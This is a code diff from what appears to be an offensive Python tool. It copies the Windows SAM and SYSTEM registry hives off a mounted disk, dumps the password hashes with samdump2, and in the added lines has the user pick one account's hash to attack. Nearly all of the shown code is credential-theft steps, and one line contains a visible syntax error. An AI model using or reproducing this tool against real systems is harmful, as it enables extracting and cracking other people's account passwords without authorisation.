@@ -30,6 +30,7 @@ def animal():
     subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
     subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
     subprocess.call("sudo samdump2 SYSTEM SAM -o targethashes.txt", shell=True)
+    subprocess.call("sudo nano targethashes.txt", shell=True)
 
     with open("targethashes.txt"), "r") as input_file:
         input_hash = input_file.readline()
@@ -66,6 +67,8 @@ def main():
         print("..............................................")
         print("                     MENU                     ")
         print("..............................................")
+        print("EDIT IN NANO WHAT USER YOU WANT TO RUN THE ATTACK WHEN PROMPT SHOWS HASHES") 
+        print("BY DELETING THE OTHER USER HASHES, SAVE AND THEN EXIT")
         print("YOU NEED A EMPTY DIRECTORY IN /mnt/ TO CONTINUE")
         print("")
         choice = input("(Y) Make New Directory (N) Continue: ")
